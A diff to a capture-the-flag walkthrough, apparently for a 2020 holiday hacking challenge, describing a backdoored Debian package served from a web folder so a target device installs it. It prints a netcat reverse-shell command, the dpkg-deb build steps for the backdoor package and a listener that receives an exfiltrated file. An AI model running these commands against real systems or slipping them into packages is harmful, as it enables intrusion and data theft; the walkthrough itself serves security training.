@@ -35,7 +35,7 @@ By opting for
 `/bin/nc 10.6.0.2 4444 -e /bin/bash`
 an interactive reverse shell can be acquired.
 
-The snippet below automatically inserts the correct IP address of the local host and places the packag:
+The snippet below automatically inserts the correct IP address of the local host and places the package in the right location of the web tree:
 ```
 cd debs
 mkdir tmp
@@ -45,17 +45,15 @@ mkdir -p ../pub/jfrost/backdoor
 dpkg-deb -b tmp ../pub/jfrost/backdoor/suriv_amd64.deb
 
 ```
-
-and then made available in the web tree folder as `pub/jfrost/backdoor/suriv_amd64.deb`.
 That way the remote device would download this package and install it. In course of the installation, the file in scope would be sent to port 4444 of the local host, which has to run the command
 
     nc -lvp 4444 > text
 to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt) (resp. receive the reverse shell connection).
 In this file it can be found that **Tanta Kringle** recused herself from the vote.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjE1MzMzMDQ2LDEyNzI2NTY0MTksODU4MT
-g4OTI5LDEwOTI3ODUzMjEsLTIwNjI2NzUyOTcsLTYxMjg5Nzc5
-OSwtODUyNzIyNzAzLDE3NTgyNDM2NzcsMTYzNDM5NDk0MSwxMj
-A0NDI2NTM5LC0xNzk4NDE1ODk2LC04NzgzOTIyMTYsNTE0MjA5
-MTU5XX0=
+eyJoaXN0b3J5IjpbMTk4MTg5ODE4MiwxMjcyNjU2NDE5LDg1OD
+E4ODkyOSwxMDkyNzg1MzIxLC0yMDYyNjc1Mjk3LC02MTI4OTc3
+OTksLTg1MjcyMjcwMywxNzU4MjQzNjc3LDE2MzQzOTQ5NDEsMT
+IwNDQyNjUzOSwtMTc5ODQxNTg5NiwtODc4MzkyMjE2LDUxNDIw
+OTE1OV19
 -->
